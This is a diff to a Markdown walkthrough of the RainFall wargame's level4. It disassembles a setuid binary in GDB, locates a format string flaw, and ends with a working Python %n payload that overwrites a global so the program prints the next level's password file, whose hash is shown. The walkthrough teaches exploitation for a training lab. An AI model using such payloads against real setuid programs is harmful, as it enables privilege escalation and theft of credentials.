@@ -20,7 +20,7 @@ level4@RainFall:~$ file ./level4
 
 The file is owned by **level5** and has the **setuid** bit.
 
-We list the functions inside the executable and analyze their assembly code with **GDB**.
+We list the functions inside the executable.
 
 ```
 (gdb) info functions
@@ -51,7 +51,7 @@ Non-debugging symbols:
 0x0804856c  _fini
 ```
 
-There are 3 interesting functions: `main()`, `p()` and `n()`.
+There are 3 user-defined functions: `main()`, `p()` and `n()`.
 
 ```
 (gdb) disas main
@@ -65,7 +65,7 @@ Dump of assembler code for function main:
 End of assembler dump.
 ```
 
-The `main()` function only calls the `n()` function.
+The `main()` function calls the `n()` function.
 
 ```
 (gdb) disas n
@@ -94,10 +94,10 @@ End of assembler dump.
 ```
 
 The `n()` function:
-- calls `fgets()` to read input into a buffer located at `ebp - 0x208`
+- calls `fgets()` to read user input and store it in `[ebp - 0x208]`
 - calls the function `p()`
-- retrieves the value of a global variable stored at memory address `0x8049810` into the `eax` register
-- Compares the value of `eax` with `0x1025544` (16930116 in decimal) and calls `system("/bin/cat /home/user/level5/.pass")` if the condition is met
+- retrieves the value stored at memory address `0x8049810` and compares it with `0x1025544`
+- calls `system()` to execute `/bin/cat /home/user/level5/.pass` if the condition is met
 
 ```
 Dump of assembler code for function p:
@@ -112,7 +112,7 @@ Dump of assembler code for function p:
 End of assembler dump.
 ```
 
-The `p()` function only calls `printf()` to print the buffer to stdout
+The `p()` function calls `printf()` to print the `fgets()` buffer from `n()`.
 
 Similar to the previous level, this function is vulnerable to a **format string attack** and the method to complete it will be the same. The only differences are the comparison with a higher number, and a deeper position of the format string in the stack due to the various function calls.
 
@@ -126,32 +126,17 @@ Starting program: /home/user/level4/level4
 AAAA
 
 Breakpoint 1, 0xb7e78850 in printf () from /lib/i386-linux-gnu/libc.so.6
-(gdb) stepi
-0xb7e78851 in printf () from /lib/i386-linux-gnu/libc.so.6
-(gdb) info registers
-eax            0xbffff430       -1073744848
-ecx            0xb7fda005       -1208115195
-edx            0xb7fd28c4       -1208145724
-ebx            0xb7fd0ff4       -1208152076
-esp            0xbffff3f8       0xbffff3f8
-ebp            0xbffff418       0xbffff418
-esi            0x0	0
-edi            0x0	0
-eip            0xb7e78851       0xb7e78851 <printf+1>
-eflags         0x200296	[ PF AF SF IF ID ]
-cs             0x73     115
-ss             0x7b     123
-ds             0x7b     123
-es             0x7b     123
-fs             0x0      0
-gs             0x33     51
-(gdb) x/16wx 0xbffff3f8
-0xbffff3f8:     0xb7fd0ff4     0x08048455     0xbffff430     0xb7ff26b0
-0xbffff408:     0xbffff674     0xb7fd0ff4     0x00000000     0x00000000
-0xbffff418:     0xbffff638     0x0804848d     0xbffff430     0x00000200
-0xbffff428:     0xb7fd1ac0     0xb7ff37d0     0x41414141     0xb7e2000a
+(gdb) i r esp
+esp            0xbffff3fc       0xbffff3fc
+(gdb) x/16wx 0xbffff3fc
+0xbffff3fc:     0x08048455      0xbffff430      0xb7ff26b0      0xbffff674
+0xbffff40c:     0xb7fd0ff4      0x00000000      0x00000000      0xbffff638
+0xbffff41c:     0x0804848d      0xbffff430      0x00000200      0xb7fd1ac0
+0xbffff42c:     0xb7ff37d0      0x41414141      0xb7e2000a      0x00000001
 ```
 
 ```bash
 python -c "print('\x10\x98\x04\x08' + '%8x' * 10 + '%16930032x' + '%n')" | ./level4
+# [...]
+0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a
 ```
